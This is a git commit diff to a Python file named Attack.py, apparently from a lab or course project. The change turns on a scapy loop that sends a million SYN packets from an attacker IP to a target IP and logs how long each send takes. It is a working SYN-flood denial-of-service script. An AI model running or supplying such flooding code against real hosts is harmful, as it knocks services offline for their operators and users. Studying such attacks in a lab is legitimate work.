7a3a3ada25ee3ce1ce4716dbd3c1d6abdfbf194c
Amir <amirg00@walla.com>
2022-12-14 10:37:40 +0200

    Add result file for python

--- Attack.py
+++ Attack.py
@@ -11,6 +11,10 @@ def build_syn_packet(src_machine_ip, dst_machine_ip):
 
 
 if __name__ == '__main__':
+    # Set the verbosity level to 0
+    # In order to not print scapy's prints to console
+    conf.verb = 0
+
     args_list = sys.argv[1:]
 
     attacker_ip = args_list[0]
@@ -20,32 +24,28 @@ if __name__ == '__main__':
     curr_pkt_index = 0
     total_pkt_sends_time = 0
 
-    # # iterate with 100 iterations and send the 10k syn to target
-    # for i in range(100):
-    #     for j in range(10000):
-    #         syn_pkt = build_syn_packet(attacker_ip, target_ip)
-    #         send(syn_pkt)
+    for i in range(100):
+        print(f"print: {i} sending 10k packets...")
+        for j in range(10000):
+            syn_pkt = build_syn_packet(attacker_ip, target_ip)
 
-    for i in range(0, 1):
-        syn_pkt = build_syn_packet(attacker_ip, target_ip)
+            # record start time of packet sending
+            start_time = time.time()
 
-        # record start time of packet sending
-        start_time = time.time()
+            # send syn packet to target
+            send(syn_pkt)
 
-        # send syn packet to target
-        send(syn_pkt)
+            # record finish time of packet sending
+            finish_time = time.time()
 
-        # record finish time of packet sending
-        finish_time = time.time()
+            total_time = finish_time - start_time
+            total_pkt_sends_time += total_time
 
-        total_time = finish_time - start_time
-        total_pkt_sends_time += total_time
+            # Append results to the file
+            write_str = f"********* PKT NO.{curr_pkt_index} *********\nTotal time taken to send packet: {total_time} seconds.\n"
+            file.write(write_str)
 
-        # Append results to the file
-        write_str = f"********* PKT NO.{curr_pkt_index} *********\nTotal time taken to send packet: {total_time} seconds.\n"
-        file.write(write_str)
-
-        curr_pkt_index += 1
+            curr_pkt_index += 1
 
     write_final_line = f"{'-'*70}\nAverage time sending packet: {total_pkt_sends_time/curr_pkt_index}"
     file.write(write_final_line)
